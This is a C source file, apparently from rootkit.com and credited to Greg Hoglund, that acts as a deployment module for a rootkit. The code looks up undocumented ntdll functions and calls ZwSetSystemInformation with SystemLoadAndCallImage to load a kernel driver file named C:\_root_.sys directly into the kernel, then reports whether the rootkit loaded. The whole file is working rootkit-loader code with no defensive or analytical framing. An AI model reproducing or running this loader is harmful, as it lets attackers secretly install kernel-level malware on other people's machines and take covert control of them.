//////////////////////////////////////// 
// New Deployment Module for rootkit 040 
// ------------------------------------- 
// -Greg Hoglund http://www.rootkit.com 
//////////////////////////////////////// 
#include <windows.h> 
#include <stdio.h> 



typedef struct _UNICODE_STRING { 
    USHORT Length; 
    USHORT MaximumLength; 
#ifdef MIDL_PASS 
    [size_is(MaximumLength / 2), length_is((Length) / 2) ] USHORT * Buffer; 
#else // MIDL_PASS 
    PWSTR Buffer; 
#endif // MIDL_PASS 
} UNICODE_STRING, *PUNICODE_STRING; 


typedef struct _ANSI_STRING {
  USHORT  Length;
  USHORT  MaximumLength;
  PCHAR  Buffer;
} ANSI_STRING, *PANSI_STRING;




typedef unsigned long NTSTATUS; 
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) == 0) 


NTSTATUS    (__stdcall *ZwSetSystemInformation)         (IN DWORD SystemInformationClass, 
                                                         IN OUT PVOID SystemInformation, 
                                                         IN ULONG SystemInformationLength); 


VOID        (__stdcall *RtlInitUnicodeString)           (IN OUT PUNICODE_STRING DestinationString, 
                                                         IN PCWSTR SourceString); 


VOID        (__stdcall *RtlInitAnsiString)              (IN OUT PANSI_STRING  DestinationString,
                                                         IN LPCSTR SourceString);


NTSTATUS    (__stdcall *RtlAnsiStringToUnicodeString)   (IN OUT PUNICODE_STRING  DestinationString,
                                                         IN PANSI_STRING  SourceString,
                                                         IN BOOLEAN  AllocateDestinationString);



typedef struct _SYSTEM_LOAD_AND_CALL_IMAGE 
{ 
    UNICODE_STRING ModuleName; 
} SYSTEM_LOAD_AND_CALL_IMAGE, *PSYSTEM_LOAD_AND_CALL_IMAGE; 



#define SystemLoadAndCallImage 38 



void main(int argc, char *argv[]) 
{ 
/////////////////////////////////////////////////////////////// 
// Why mess with Drivers? 
/////////////////////////////////////////////////////////////// 
SYSTEM_LOAD_AND_CALL_IMAGE GregsImage; 
WCHAR daPath[] = L"\\??\\C:\\_root_.sys"; 
ANSI_STRING str;

    ////////////////////////////////////////////////////////////// 
    // get DLL entry points 
    ////////////////////////////////////////////////////////////// 
    if( !(RtlInitUnicodeString =(void *) GetProcAddress( GetModuleHandle("ntdll.dll"), "RtlInitUnicodeString" )) ) 
    {
        exit(1); 
    }

    if( !(RtlInitAnsiString =(void *) GetProcAddress( GetModuleHandle("ntdll.dll"), "RtlInitAnsiString" )) ) 
    {
        exit(1); 
    }

    if( !(RtlAnsiStringToUnicodeString = (void *) GetProcAddress( GetModuleHandle("ntdll.dll"), "RtlAnsiStringToUnicodeString" )) ) 
    {
        exit(1); 
    }
    

    if( !(ZwSetSystemInformation = (void *) GetProcAddress( GetModuleHandle("ntdll.dll"), "ZwSetSystemInformation" )) ) 
    {
        exit(1); 
    }


    //RtlInitAnsiString(&str, argv[1]);
    
    RtlInitUnicodeString( &(GregsImage.ModuleName), daPath ); 

  /*  if(!NT_SUCCESS(RtlAnsiStringToUnicodeString( &(GregsImage.ModuleName), &str, TRUE )))
    {
        printf("No se pudo inicializar cadena UNICODE\n");
        exit(1);
    }*/

    if(NT_SUCCESS(ZwSetSystemInformation(SystemLoadAndCallImage, &GregsImage, sizeof(SYSTEM_LOAD_AND_CALL_IMAGE)) )) 
    { 
        printf("Rootkit Loaded.\n"); 
    } 
    else 
    { 
        printf("Rootkit not loaded.\n"); 
    } 


} 


